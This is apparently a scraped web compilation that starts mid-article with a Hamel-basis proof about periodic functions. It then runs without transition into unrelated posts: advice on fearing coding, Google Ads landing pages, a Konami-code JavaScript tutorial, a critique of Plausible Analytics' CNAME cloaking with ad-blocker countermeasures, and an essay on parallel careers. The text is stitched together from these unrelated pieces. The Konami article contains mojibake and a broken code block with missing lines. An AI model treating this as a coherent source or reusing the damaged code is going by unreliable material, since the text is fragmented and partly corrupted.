  its subfields, so \( \mathbb{R} \) must be a vector space over \(
  \mathbb{Q}. \)
</p>


<h2 id="problem"><a href="#problem">Problem</a></h2>

<p>
Here is an interesting problem related to vector spaces that I came
across recently:
</p>

<div>
<p>
Define two periodic functions \( f \) and \( g \) from \( \mathbb{R} \)
to \( \mathbb{R} \) such that their sum \( f + g \) is the identity
function. The axiom of choice is allowed.
</p>
<p>
A function \( f \) is periodic if there exists \( p \gt 0 \) such that
\( f(x + p) = f(x) \) for all \( x \) in the domain.
</p>
</div>

<p>
<em>
If you want to think about this problem, this is a good time to pause
and think about it. There are spoilers ahead.
</em>
</p>


<h2 id="solution"><a href="#solution">Solution</a></h2>

<p>
The axiom of choice is equivalent to the statement that every vector
space has a basis. Since the set of real numbers \( \mathbb{R} \) is a
vector space over the set of rational numbers \( \mathbb{Q}, \) there
must be a basis \( \mathcal{H} \subseteq \mathbb{R} \) such that every
real number \( x \) can be written uniquely as a finite linear
combination of elements of \( \mathcal{H} \) with rational coefficients,
that is,
\[
  x = \sum_{a \in \mathcal{H}} x_a a
\]
where each \( x_a \in \mathbb{Q} \) and \( \{ a \in \mathcal{H} \mid x_a
\ne 0 \} \) is finite. The set \( \mathcal{H} \) is also known as the
Hamel basis.
</p>

<p>
In the above expansion of \( x, \) we use the notation \( x_a \) to
denote the rational number that appears as the coefficient of the basis
vector \( a. \) Therefore \( (x + y)_{a} = x_a + y_a \) for all \( x, y
\in \mathbb{R} \) and all \( a \in \mathcal{H}. \)
</p>

<p>
We know that \( b_a = 0 \) for distinct \( a, b \in \mathcal{H} \)
because \( a \) and \( b \) are basis vectors. Thus \( (x + b)_{a} = x_a
+ b_a = x_a + 0 = x_a \) for all \( x \in \mathbb{R} \) and distinct \(
a, b \in \mathcal{H}. \) This shows that a function \( f(x) = x_a \) is
a periodic function with period \( b \) for any \( a \in \mathcal{H} \)
and any \( b \in \mathcal{H} \setminus \{ a \}. \)
</p>

<p>
Let us define two functions:
\begin{align*}
  g(x) &amp; = \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a,
  &amp;
  h(x) &amp; = x_b b.
\end{align*}
where \( b \in \mathcal{H} \) and \( x \in \mathbb{R}. \) Now \( g(x) \)
is a periodic function with period \( b \) for any \( b \in \mathcal{H}
\) and \( h(x) \) is a periodic function with period \( c \) for any \(
c \in \mathcal{H} \setminus \{ b \}. \) Further,
\[
  g(x) + h(x)
  = \left( \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a \right) + x_b b
  = \sum_{a \in \mathcal{H}} x_a a
  = x.
\]
Thus \( g(x) \) and \( h(x) \) are two periodic functions such that
their sum is the identity function.
</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1603451219087/reohUwxma.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>Most of us who have a fear of coding, in reality, have a fear of failing.</p>
<p>Even if we haven't started learning a programming language yet, we already think we will fail instantly.</p>
<p>Why do we think like this?</p>
<p>There are can be a bunch of reasons:</p>
<ul>
<li>We think that it’s too difficult.</li>
<li>We think that we are not meant to code.</li>
<li>We think that it’s too late and we are too old.</li>
</ul>
<p>And the list goes on.</p>
<p>But let’s face the truth. All of them are just excuses. And behind every excuse, we hide a fear of failure. That is what is stopping us.</p>
<p>And <strong>we will never start anything when in our minds we think that we will fail.</strong></p>
<p>We tell ourselves, “Why do I even start something if I fail?” We have no reason to start because we think that we will not succeed. That is why we have a fear of programming. We think that we will not succeed.</p>
<p>To overcome this you should reprogram your brain to success.</p>
<p>Here is how.</p>

<p>Most people mislead talent with ages of practice. We always say “This person is talented” when we see higher than average results. When in fact, this person began to practice from an early age.</p>
<p><strong>It is very easy to defend our failures with the word “talented.”</strong></p>
<p>What you should do is to start practicing. Start to code for just 30 minutes every other day. It doesn’t matter how much you code at first, you just need to start doing it.</p>

<p>Most people start their coding journey from the wrong step. They chose the programming language first. But you need to start with a problem.</p>
<p>We don’t write code just to write code. We solve problems with the code.</p>
<p>So you should find some problems or projects that you are interested in. </p>
<p>Ask yourself, “Why do I want to start coding? What motivates me?”</p>
<p>After you find it, do some research to figure out which programming language is most appropriate for your project.</p>

<p>You don’t need to know 100% of the programming language to start coding or build things. Apply Pareto law.</p>
<p>The Pareto law states that for many outcomes roughly 80% of consequences come from 20% of the causes. In other words, with knowing 20% of the programming language you can build 80% of possible things (in reality numbers will differ.)</p>
<p>So start with the fundamentals of the programming language, and then go deeper into it if you need it.</p>
<p>I don’t recommend falling into the rabbit hole of some language specification at first. Your learning path can be extended for months. Start from basics then go deeper.</p>

<p>Learning more than one or two languages at once produces a lot of bad outcomes:</p>
<ul>
<li>You are distracting yourself.</li>
<li>You delay when you actually start building things.</li>
<li>You don’t see any big progress and start procrastinating.</li>
</ul>
<p>The cure is to pick one language and stick with it. Stop switching back and forth between programming languages. <strong>Multitasking is not working. </strong>Focus only on one thing at a time.</p>

<p>The fastest way to learn something is to practice.</p>
<p>For our brain, if you gain knowledge without applying it, it’s a waste of time. It will simply forget it. So you need to put your knowledge into practice.</p>
<p>Watching YouTube tutorials? Open text editor and code what you just learned.</p>
<p>Learning web development? Choose a small project and start building it.</p>
<p>Play and experiment.</p>

<p>Most of us instantly procrastinate when we open our to-do list and see a task like, “Create a website.” We know that it is very big. We know that we need to put a lot of effort into accomplishing it. So we just “Nah, maybe tomorrow.” but “tomorrow” never comes.</p>
<p>To defeat our laziness and start doing, we need to fool our brain. We need to convince him that it is very easy to do our task. Here is how.</p>
<p>Split your big task into small ones. Each small task should be completed in no more than 2-4 hours.</p>
<p>Todo list before:</p>
<p>Tasks:</p>
<ol>
<li>Create a website.</li>
</ol>
<p>Todo list after:</p>
<p>Tasks:</p>
<ol>
<li>Buy a domain name.</li>
<li>Create a website design in Figma.</li>
<li>Create a home page UI with CSS and HTML.</li>
<li>…</li>
</ol>
<p>Now, when you open your to-do list you need to take less effort to start when you know that each task takes a lot less than a couple of weeks.</p>
<p><strong>Without starting you will always be learning.</strong></p>

<p>And the last one, my favorite, the fear setting framework by Tim Ferris. He is an author of the New York Times bestseller The 4-Hour Workweek and host of one of the most popular podcasts in the world, the Tim Ferris show.</p>
<p>A fear setting framework can help you overcome your fear of coding and other fears that are holding your back.</p>
<p>Here is how to do it (<a target="_blank" href="https://mindfulambition.net/fear-setting-tim-ferriss/">full version</a>).</p>
<ol>
<li>Make three columns and label them “Define”, “Prevent”, and “Repair”.</li>
<li>In column one, define everything you fear about the idea of taking action.</li>
<li>In column two, list ways you could reduce the likelihood of each of the worst-case scenarios from happening.</li>
<li>In column three, list ways you could repair the damage if this situation were to come true.</li>
<li>Assess the impact of these worst-case scenarios on a scale of 1-10.</li>
<li>Assess the potential positive benefit of these successes on a 1-10 scale.</li>
<li>Make three columns on the page and label them 6 months, 1 year, and 3 years.</li>
<li>Write down the potential costs of inaction.</li>
</ol>

<p>I hope these seven pieces of advice can help you to start coding and achieve what you want.</p>
<p>Remember, <strong>when you bind yourself to failure, you will fail.</strong></p>

		<p>For very competitive keywords on Google Ads, you’ll generally find that the cost per click is very high. In the case of some of the SaaS clients that I’ve worked with, they’ve been as high as $75 for just one click!</p>



<p>To bring down the cost of acquisition as well as CPC, it’s best to have <strong>dedicated landing pages</strong> for highly competitive search terms on Google.</p>



<p>This will not only bring down your CPC rate but also get you better conversions.</p>



<p>In general, you want to have something that is <em>highly specific</em> to the search term and the <em>search intent</em>.</p>



<p>It’s good to consider the frame of mind that the user is in when they’re typing in their search query — the conversation that’s going through their head.</p>



<p>To make this a bit clearer, let’s go through an example. </p>

<h2><span id="Landing_Page_Software_Example">Landing Page Software Example</span></h2>



<p>The first thing to do is to checkout the current Search Engine Results Pages (SERP) for your targeted search term. Let’s use the keywords “Landing Page Software” as an example.</p>

<p>Check out the current Google Ads (when it’s competitive, there will always be ads) and the landing page used for those ads. </p>



<p>You’ll see that for the first ad, Instapage is directing people to a <strong>dedicated landing page</strong> (https://instapage.com/products/landing-page-software) instead of the home page (https://instapage.com). </p>



<p>The second ad is a <strong>LIST</strong> of landing page software. </p>

<p>If you scroll down the SERP, you’ll see a list of questions that people often ask:</p>

<p>You’ll see that the first question is, “<em>What is the best landing page software?</em>“</p>



<p>Now if you look at the top organic search results for landing page software, you’ll see the following:</p>

<hr>



<h2><span id="Search_Intent">Search Intent</span></h2>



<p>You have a list of “<strong>11 Best Landing Page Builder</strong>” and “<strong>4 Best Landing Page</strong>” at the top.</p>



<p>What does this say about the search intent?</p>



<p>That people are <em>not decided</em>. People are in the research phase. </p>



<p>That’s why Google is choosing to serve the list pages and review pages at the top — because it’s what users of the search term find the most useful. That’s also why it’s a good exercise to check who’s ranked the highest on Google’s organic search results. </p>



<p>Another useful exercise you can do with AHREFs is to see if there have been any major moves in the ranks. This can point to something that works particularly well.</p>



<figure><img data-attachment-id="1569" data-permalink="https://ruizhidong.com/best-practices-for-optimizing-a-landing-page-for-google-ads/ahrefs_for_landing_page_software/" data-orig-file="https://i1.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software.jpg?fit=1312%2C610&amp;ssl=1" data-orig-size="1312,610" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ahrefs_for_landing_page_software" data-image-description="" data-medium-file="https://i1.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software.jpg?fit=300%2C139&amp;ssl=1" data-large-file="https://i1.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software.jpg?fit=900%2C418&amp;ssl=1" loading="lazy" width="900" height="418" src="https://i2.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software-1024x476.jpg?resize=900%2C418&amp;ssl=1" alt="ahrefs landing page" srcset="https://i1.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software.jpg?resize=1024%2C476&amp;ssl=1 1024w, https://i1.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software.jpg?resize=300%2C139&amp;ssl=1 300w, https://i1.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software.jpg?resize=768%2C357&amp;ssl=1 768w, https://i1.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software.jpg?resize=573%2C266&amp;ssl=1 573w, https://i1.wp.com/ruizhidong.com/wp-content/uploads/2020/10/ahrefs_for_landing_page_software.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1"><figcaption>ahrefs SERP position history</figcaption></figure>



<p>In this case, you can see that Instapage has made a recent and rapid entry onto the list with the title, “<em>The 17 Best Landing Page Software Tools for Marketers (2020</em>).”</p>



<p>You can also see that the very first result uses an odd number of 11 as well. Not particularly creative but enough to be interesting for clicking.</p>



<hr>



<h2><span id="Google_Ads_Creatives_and_Dedicated_Landing_Pages">Google Ads Creatives and Dedicated Landing Pages</span></h2>



<p>Coming back to our own Google Ads, we’d start with some ideas for headlines.</p>



<p>The good news here is that they all look more or less <em>the same</em>. That gives you an opportunity to <strong>stand out</strong> by trying a different angle and capture more of the market. </p>



<p>If you felt lazy, you can use the same formula and say, <strong><em>9 or 13 Best Landing Page Software Tools</em></strong> with a dedicated landing page for the Google Ad.</p>



<p>Or you can try something different. </p>



<p>Since we know what the search intent is, we can help that person along in their search process by answering the questions they have in their head.</p>



<p><em>Some ideas to start experimenting with:</em></p>



<ul><li>7 Must Haves for Landing Page Software</li><li>Elements of a Successful Landing Page</li><li>What Makes A Landing Page Convert?</li><li>Proven Landing Page Techniques</li><li>9 Landing Pages That Made A Million Dollars</li></ul>



<p>These are just a few headlines off the top of my head (you’re welcome to steal these).</p>



<p>The next step is to build the dedicated landing page.</p>



<p>The question as you’re building out the landing page is:</p>



<ul><li><em>Is this what the searcher is looking for? </em></li><li><em>Am I helping the reader out in their research process? </em></li><li><em>Am I providing content that’s relevant and useful? </em></li><li><em>Am I helping the reader figure out what the “best landing page” software is? </em></li></ul>



<p>The process for building your own landing page will be the same.</p>



<p>Do the research, figure out the search intent, come up with some ideas to experiment with, and then build the relevant landing pages.</p>

October 23, 2020 | https://www.amitmerchant.com/implement-konami-code-easter-egg/ | <a href="https://web.archive.org/web/*/https://www.amitmerchant.com/implement-konami-code-easter-egg/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>So, the other day, I was going through my Twitter feed and I saw <a href="https://twitter.com/avstorm/status/1280367397279608833?s=20">this tweet</a>. This user had explored an easter egg on the newly designed <a href="https://stripe.com/en-us">Stripe.com</a>â€™s website.</p>

<p>The easter egg is nothing but a sequence of different keypress known as <a href="https://en.wikipedia.org/wiki/Konami_Code">Konami Code</a> (<kbd>â†‘</kbd><kbd>â†‘</kbd><kbd>â†“</kbd><kbd>â†“</kbd><kbd>â†�</kbd><kbd>â†’</kbd><kbd>â†�</kbd><kbd>â†’</kbd><kbd>B</kbd><kbd>A</kbd>), which when achieved, can invoke this control panel at the bottom of the page.</p>

<p><a href="https://www.amitmerchant.com/images/stripe-konami-code.png"><img src="https://www.amitmerchant.com/images/stripe-konami-code.png" alt=""></a></p>

<p>Using this panel, you can play around with the gradients which are there at the top of the header. Things such as turn off different gradient colors, pause/play the animation, and so on.</p>

<blockquote>
  <p>The Konami Code (Japanese: ã‚³ãƒŠãƒŸã‚³ãƒžãƒ³ãƒ‰, Konami komando, â€œKonami commandâ€�) is a cheat code that appears in many Konami video games, and some non-Konami games. In the original code, the player can press the sequence of buttons (mentioned previously) on the game controller to enable a cheat or other effects.</p>
</blockquote>

<p>I found this so cool and I was tempted to implement something like this on my blog as well.</p>

<p>And it turns out, itâ€™s rather really simple to do so. Hereâ€™s the entire code in vanilla JavaScript which can invoke a cool Confetti upon pressing Konami code sequence.</p>

<div><div><pre><code><span>const</span> <span>keySequence</span> <span>=</span> <span>[];</span>
<span>let</span> <span>konamiString</span> <span>=</span> <span>''</span><span>;</span>

    <span>);</span>
    <span>konamiString</span> <span>=</span> <span>konamiCode</span><span>.</span><span>join</span><span>(</span><span>''</span><span>);</span>

    <span>if</span> <span>(</span><span>keySequence</span><span>.</span><span>join</span><span>(</span><span>''</span><span>).</span><span>includes</span><span>(</span><span>konamiString</span><span>))</span> <span>{</span>
        <span>const</span> <span>confettiConfig</span> <span>=</span> <span>{</span> <span>target</span><span>:</span> <span>'</span><span>confetti-holder</span><span>'</span> <span>};</span>
        <span>const</span> <span>confetti</span> <span>=</span> <span>new</span> <span>ConfettiGenerator</span><span>(</span><span>confettiConfig</span><span>);</span>
        <span>confetti</span><span>.</span><span>render</span><span>();</span>
    <span>}</span>
<span>});</span>
</code></pre></div></div>

<p>Letâ€™s break down the code and understand whatâ€™s going on.</p>

<p>The variable <code>keySequence</code> is used to store the key sequence that the user on the site will press. The <code>konamiCode</code> is the variable that holds the actual Konami code as an array, which Iâ€™m using to match the key sequence later in the code. The <code>konamiString</code> is used to store the string form of the <code>konamiCode</code> array later in the code.</p>

<p>Next, Iâ€™ve registered an <a href="https://developer.mozilla.org/en-US/docs/Web/API/EventListener">event listener</a> which will listen to the <code>keyup</code> event. Inside the event listener, Iâ€™m storing the key sequence by pushing it into the <code>keySequence</code> variable through the following line of code.</p>



<p>The next line is important. The Konami code consists of only 10 keys. So, we donâ€™t want to store more than 10 keys into the <code>keySequence</code> as that would be overkill. For this, weâ€™re <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/splice">splicing</a> off the array from the reverse to the length of the Konami code with the following code like so.</p>

<div><div><pre><code><span>keySequence</span><span>.</span><span>splice</span><span>(</span>
    <span>-</span><span>konamiCode</span><span>.</span><span>length</span> <span>-</span> <span>1</span><span>,</span> 
    <span>keySequence</span><span>.</span><span>length</span> <span>-</span> <span>konamiCode</span><span>.</span><span>length</span>
<span>);</span>
</code></pre></div></div>

<p>The rest of the code is simple. All we need to do is convert both <code>keySequence</code> and <code>konamiCode</code> to string and compare both to invoke the easter egg like so.</p>

<div><div><pre><code><span>konamiString</span> <span>=</span> <span>konamiCode</span><span>.</span><span>join</span><span>(</span><span>''</span><span>);</span>

<span>if</span> <span>(</span><span>keySequence</span><span>.</span><span>join</span><span>(</span><span>''</span><span>).</span><span>includes</span><span>(</span><span>konamiString</span><span>))</span> <span>{</span>
    <span>// invoke the eater egg of your choice</span>
<span>}</span>
</code></pre></div></div>

<p>In the <code>if</code> condition, you can invoke whatever youâ€™d like. Iâ€™ve invoked a cool confetti effect on the page using <a href="https://agezao.github.io/confetti-js/">this library</a>. But you can choose to do invoke a host of other things. Like the one on <a href="https://stripe.com/en-us">Stripe.com</a>. The possibilities are endless!</p>

<p>But before that, try it out on here right now and feel the superpower! ðŸ˜‰</p>

<p>I hope you learned something new here and let me know in the comments what youâ€™d like to do with Konami code your site/blog/web app.</p>

<p>Until next time!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For the last few weeks, my feeds and federated timelines have been filled with absolutely brilliant marketing campaigns for Plausible Analytics, the new open-source privacy-focused website analytics tool. Plausible Analytics has enjoyed exponential growth and is frequently recommended by privacy-conscious voices in the FOSS community.</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io-663x317.png" alt="Plausible Analytics - elementary OS"></a><figcaption><p>Plausible Analytics showing public visitor metrics for the elementary OS website.</p></figcaption></figure><p>So does Plausible Analytics deliver on its promise to provide an ethical privacy-friendly alternative to Google Analytics? Let’s have a closer look.</p><p>Plausible Analytics claims to be compliant with GDPR, CCPA, and PECR out of the box. Allegedly, it’s not necessary to ask for and obtain user consent as no personal data is ever being collected.</p><p>Plausible Analytics does however admit that it collects your user-agent and IP address to uniquely identify your visit. Additionally, it stores information about your browser, operating system, device type, and location (based on your IP address). Even if the stored personal data is being anonymized (and not pseudonymized which sounds more likely), the data is still being processed.</p><p>If you’re familiar with GDPR, then you’re likely aware that it certainly covers collecting of online identifiers, such as IP addresses, and browser characteristics used for fingerprinting.</p><p>Another issue I came across when signing up for their service was that Plausible Analytics doesn’t provide their customers with a GDPR data processing agreement (DPA). When you, the website owner, allows a third party to collect and process personal data, you’re required to sign a DPA to be GDPR compliant.</p><h2 id="privacy-friendly-website-analytics">Privacy-friendly website analytics</h2><p>In my opinion, privacy-friendly should be more than a buzzword used to throw shade at Google Analytics. Here are a few key points that I attribute to being privacy-friendly (none of which are adhered to by Plausible Analytics):</p><ul><li>Ask users for their consent before tracking.</li><li>Allow users who don’t want to be tracked to opt-out.</li><li>Respect users providing a Do Not Track (DNT) header.</li><li>Don’t disguise your tracker as a first-party resource to avoid ad-blockers.</li></ul><p>Being privacy-friendly is also about respecting one’s right to choose what data to share, and with whom. Plausible Analytics seems to think that it’s alright to make that choice on your behalf and I wholeheartedly disagree.</p><h2 id="cname-cloaking">CNAME cloaking</h2><p>This abysmal technique remains ever popular with <a href="https://github.com/uBlockOrigin/uBlock-issues/issues/780" target="_blank">unethical advertisers</a> as an effective countermeasure against ad-blockers. The technique effectively disguises the third-party tracker as a first-party resource by having the website owner pointing a subdomain to the third-party server using a CNAME record.</p><p>Plausible Analytics are at least upfront about why they deploy CNAME cloaking, as explained in their documentation:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking-663x277.png" alt="Plausible Analytics - CNAME cloaking"></a><figcaption><p>Plausible Analytics documenting how to defeat ad-blockers.</p></figcaption></figure><p>What, some people are trying to block your privacy-friendly tracker? Now we can’t have that, tracking absolutely everyone gives Plausible Analytics a competitive edge against Google Analytics.</p><h3 id="how-does-cname-cloaking-work">How does CNAME cloaking work?</h3><p>An excellent question, but first we need to understand exactly what makes CNAMEs special by design and implementation as according to <a href="https://tools.ietf.org/html/rfc1034" target="_blank">rfc1034</a>.</p><blockquote><div><p>A CNAME RR identifies its name as an alias, and specifies the corresponding canonical name.</p><p>When a name server fails to find a desired RR in the resource set associated with the domain name, it checks to see if the resource set consists of a CNAME record with a matching class. If so, the name server includes the CNAME record in the response and restarts the query at the domain name specified in the data field of the CNAME record.</p></div></blockquote><p>Let’s see how it works by using the domain markosaric.com as an example. The domain is owned by Marko Saric, digital marketing guru of team Plausible Analytics. The subdomain he uses to disguise the tracker is ms.markosaric.com.
When performing a DNS query for ms.markosaric.com, we get the following response:</p><pre><code>$ dig ms.markosaric.com

;; ANSWER SECTION:
ms.markosaric.com.	14400	IN	CNAME	custom.plausible.io.
custom.plausible.io.	300	IN	A	46.101.161.209
</code></pre><p>As we can tell, the DNS resolver identifies ms.markosaric.com as an alias for custom.plausible.io. Additionally, because it’s a CNAME record, we also get the A record for custom.plausible.io which is pointing to 46.101.161.209.</p><p>When a browser requests the first-party resource for ms.markosaric.com, the same “DNS based redirect” takes place, and the tracker gets inserted from custom.plausible.io. However, because this happens at the DNS level, ad-blockers are unable to identify the tracker.</p><p>Let’s see how this dark magic repels uBlock Origin on Chromium after adding a custom filter to block the plausible.io domain.</p><pre><code>! Custom uBlock Origin filter for plausible.io
||plausible.io^
</code></pre><p>The image below consists of two merged screenshots. The left side of the image shows how the custom filter fails to stop the tracker when CNAME cloaking is in effect. The right side of the image shows the same filter successfully blocking the tracking domain when accessed directly:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak-663x232.png" alt="CNAME cloaking"></a><figcaption><p>CNAME cloaking used to escape filtering from uBlock Origin on Chromium.</p></figcaption></figure><p>As shown above, the tracker (index.js) is being loaded from the remote IP address of 46.101.161.209, which resolves to custom.plausible.io. However, the script is not blocked and the harvesting of personal data is in full effect.</p><p>This technique is effective because uBlock Origin doesn’t have access to DNS queries and is entirely oblivious to the trick being pulled behind its back. I wouldn’t describe this approach as being either privacy-friendly or ethical.</p><h2 id="how-to-block-plausible-analytics">How to block Plausible Analytics</h2><p>Though intrusive, unethical, and annoying, CNAME cloaking can be defeated. I’ll scratch the surface with a few options that will help you to protect your privacy.</p><h3 id="ublock-origin-on-firefox">uBlock Origin on Firefox</h3><p>You can easily block Plausible Analytics with uBlock Origin on Firefox by adding the filter I referenced earlier in this article. Firefox allows extensions (if given permission) to resolve domain names by exposing a <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dns" target="_blank">DNS API</a>. This allows uBlock Origin to identify and block disguised trackers:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png" alt="uBlock Origin on Firefox"></a><figcaption><p>uBlock Origin using Firefox’s DNS API to expose and block CNAME cloaking.</p></figcaption></figure><h3 id="dnscrypt-proxy">dnscrypt-proxy</h3><p>If you don’t want to use Firefox, or prefer to block Plausible Analytics on the DNS level, then you’ll need a tool that can scrub CNAME responses. The right tool for the job in my opinion is <a href="https://github.com/DNSCrypt/dnscrypt-proxy" target="_blank">dnscrypt-proxy</a>. The dnscrypt-proxy client’s domain blacklist provides support for CNAME blocking.</p><p>The following animated gif shows how dnscrypt-proxy can block the CNAME record containing the unwanted tracker.</p><p><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/dnscrypt-proxy-cname-blacklist.gif" alt="dnscrypt-prox blocking a cloaked CNAME record" title="Blocking Plausible Analytics with dnscrypt-proxy"></p><p>Pretty neat huh.</p><h3 id="other-options">Other options</h3><p>Well there are a few, you could always:</p><ul><li>Block any IP address in use by custom.plausible.io with your firewall.</li><li>Disable JavaScript in your browser (it will block the tracking, not the connection).</li><li>Block the <a href="https://github.com/rogercomply/plausible-analytics-blocklist/blob/master/subdomains" target="_blank" rel="noopener noreferrer nofollow" title="A list of subdomains used for CNAME cloaking with Plausible Analytics">subdomains</a> used for CNAME cloaking.</li><li>Use a DNS service provider already blocking unwanted trackers.</li><li>Ask Plausible Analytics to respect your right to privacy.</li></ul><h2 id="what-does-the-foss-say">What does the FOSS say?</h2><p>I’ll admit to being mildly amused and surprised that privacy-conscious people in the FOSS community are promoting this service. Even more surprising is the fact that they’re configuring CNAME cloaking for their websites. I mean, seriously, you can’t exactly argue ignorance in this matter.</p><p>Plausible Analytics is good at targeted marketing to the right people. However, I don’t personally believe that the product delivers on its promise. Open-source or not, the business model here is still to monetize personal data for profit however you may wish to dress it up.</p></div></div>]]>

<p><em>TL;DR</em></p>



<p>* From executives to individual contributors, we all make one career bet at a time.</p>



<p>* This is poor “portfolio theory” (to use a phrase from investing), meaning that this is not a balanced “portfolio” of diverse bets. It’s a career “portfolio” of extremely concentrated bets.</p>



<p>* You can win big this way, but admittedly, most will not.</p>



<p>* With current technology, remote work-styles, and the catalyst of Covid-19, the future will allow for (and incentivize) multiple career bets at the same time; albeit perhaps at different stages of each path — like an architect with three parallel projects (one in concepting, one in planning, and one in construction).</p>



<p>* With the possibility, the incentives, and the social norms in place, it will become the ideal work-style for executives over the next decade… From “freelancing” as a performance marketer to “C-lancing” as a CMO of three companies at the same time.</p>



<p>* This isn’t for everybody, but for the adventurous minority, a new wave of working style will emerge in the coming years.</p>



<p>—</p>



<p>I’m sitting on an inflatable mattress, working from an iPad, listening to the world’s largest music library with Apple music (and my in-ear headphones). </p>



<p>I’m going over my “to-do” list for today with my three main projects — angel investing (I’m about seven years into this “project” of investing), Magic Mind (<a href="http://magicmind.co/">magicmind.co</a>, a drink I created after writing a book on natural ingredients for productivity enhancement last year), and podcasting (I host a new-ish podcast called “<a rel="noreferrer noopener" href="http://belowthelinepod.com/" target="_blank">Below The Line</a>”). </p>



<p>And I’ll manage all of these projects today from my iPad, on an inflatable mattress, listening to the world’s music with my handy headphones in.</p>



<p>On a monthly basis, my time is spent coordinating with dozens of founders, executives, consultants, contractors, and freelancers, spanning topics from podcast newsletters, helping founders wind their company down in a healthy way, and coordinating the sale of a matcha/nootropic tea in London. And it’s all from my iPad on an air mattress.</p>



<p>A lot has changed in the last few years (for example, my iPad is <a href="https://www.creativebloq.com/features/ipad-pro-vs-macbook-air">significantly faster than my Apple laptop</a> — Can you tell I really dig the iPad?). </p>



<p>As I reflect on the (surprising) fluidity in which I’m able to balance these three very different projects, I continue to find myself thinking about how the year 2020 is vastly different than the year 2000. It is the combination of technology and work-style that seems to make these possible and somewhat seamless. </p>



<p>My next thought then turns to “why aren’t we all talking about how different our working lives can be in the 2020?” The answer seems to be that most of us still think we’re basically living in the same world as 20 years ago. In other words, technologically, we live in 2020 — but our psychology is very much stuck in the 20th century. We might remark on what different technology we have (a super computer in 3Bn pockets), but it hasn’t infiltrated what it can truly allow us to do in terms of our careers. </p>



<p><em>Side-bar: I remember reading in Jonathan Safron Foer’s book “Eating Animals” that despite today’s access to global supply chains and ingredients, the average Americans still eats roughly the same diet as we did 100 years ago, and the average American consumes only .25% of the world’s available ingredients in their dishes. </em></p>



<p>It seems that “possibilities” + “potential” can shift rather quickly, but our collective psychology and norms take <em>much</em> longer to catch up (read more about my views on  “<a href="https://jjbeshara.com/2018/01/20/mobs-vs-crowds-2/">Community vs Truth</a>” here). But add the fear of death into the equation… And it tends to be a powerful catalyst; examples being face-masks, social distancing, and just about every company going remote in a four-week span.</p>



<p>You could maybe make the case that our collective psychology is still stuck in the 15th century (zero-sum world, Earth is at the center of the universe, the world is made of “solid” things, etc), but let’s be generous and say that most of our cultural psychology is only stuck in the 20th century. </p>



<p>And let’s focus that on the 20th century invention of a “career”. The 20th century invention of a “career” was more or less defined as one path per life, one job per life (laborer on the manufacturing line at Coca-Cola, farmer in Idaho, advertising person on Madison Ave.). </p>



<p>Like a road trip with one destination in mind, with time spent finding the one highway to get you there. </p>



<p>That was the goal; to get to that destination where you could rest and relax. Maybe it was a goal to earn a pension after your 30 years on the General Motors manufacturing floor or to get tenure as a professor. One destination per person. One path that you should settle on by your early 30’s. </p>



<p>In the last few years, the norm has changed drastically, but it’s still a legacy of last century. Now it is one path “at a time” and one job “at a time.” Changing it up as fleets of fancy (or destabilizing forces like a layoff) take you in a new direction every few years. But it’s still one path and one job at a time, and hopefully settling into a groove by your 40’s. It’s still a road trip, but maybe it’s to Tahoe for a little while and then to Los Angeles after that and then settling in down in Sedona.</p>



<p>Over the last few years, you could contrast this single-path-at-a-time career track with your freelancer friend, your friend that is contracting for two large companies, the gig worker, the person that owns the agency, or the venture investor that is simultaneously on 10 boards of 10 different companies. The term multi-tasking doesn’t quite fit here. Everyone multi-tasks throughout the day. These people were multi-pathing.</p>



<p>But what if a CEO could multi-path?&nbsp;</p>



<p>Or a CFO?&nbsp;</p>



<p>Or a head of marketing?&nbsp;</p>



<p>No, no, no. It’s got to be one company at a time, one job at a time. Right? Only investors can do that.</p>



<p>People need to be judged by the time they’re in the office, and there’s no such thing as remote work. Right?</p>



